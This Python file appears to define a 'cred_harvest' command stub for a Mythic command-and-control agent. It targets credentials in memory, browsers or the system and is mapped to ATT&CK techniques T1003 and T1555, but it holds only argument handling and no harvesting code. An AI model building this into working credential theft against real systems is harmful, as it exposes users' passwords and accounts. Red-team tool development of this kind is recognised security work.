from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class CredHarvestArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="source",
                type=ParameterType.ChooseOne,
                choices=["memory", "browsers", "system"],
                description="Source of credentials to harvest",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("source", self.command_line)
        else:
            self.add_arg("source", "memory")

class CredHarvestCommand(CommandBase):
    cmd = "cred_harvest"
    needs_admin = False
    help_cmd = "cred_harvest [memory|browsers|system]"
    description = "Harvest credentials from various sources"
    version = 1
    author = "@igidir"
    argument_class = CredHarvestArguments
    attackmapping = ["T1003", "T1555"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        source = task.args.get_arg("source")
        task.display_params = f"Harvesting credentials from {source}"
        return task

    async def process_response(self, response: AgentResponse):
        pass